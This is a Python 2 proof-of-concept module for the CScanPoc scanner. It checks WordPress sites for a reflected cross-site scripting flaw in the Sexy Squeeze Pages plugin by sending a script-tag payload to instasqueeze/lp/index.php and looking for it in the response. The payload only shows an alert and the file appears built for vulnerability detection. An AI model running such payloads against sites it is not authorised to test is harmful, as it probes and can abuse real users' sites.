# coding: utf-8
import urllib2

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0122' # 平台漏洞编号，留空
    name = 'WordPress Sexy Squeeze Pages Plugin XSS' # 漏洞名称
    level = VulnLevel.LOW # 漏洞危害级别
    type = VulnType.XSS # 漏洞类型
    disclosure_date = '2014-12-08'  # 漏洞公布时间
    desc = '''
    Cross site scripting has benn found on instasqueeze/lp/index.php
    inurl:wp-content/plugins/instasqueeze.
    ''' # 漏洞描述
    ref = 'https://www.yascanner.com/#!/x/11200' # 漏洞来源
    cnvd_id = 'Unknown' # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Sexy Squeeze Pages Plugin'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '86d6fdbe-5cf0-4ac8-94db-6b18a88af6ac' # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29' # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
    
    def verify(self):
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                    target=self.target, vuln=self.vuln))
            payload = '/wp-content/plugins/instasqueeze/lp/index.php?id="/><script>alert(233)</script>'
            verify_url = self.target + payload
            req = urllib2.Request(verify_url)
            content = urllib2.urlopen(req).read()
            if '"/><script>alert(233)</script>' in content:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                            target=self.target, name=self.vuln.name))
            
        except Exception, e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        super(Poc, self).exploit()

if __name__ == '__main__':
    Poc().run()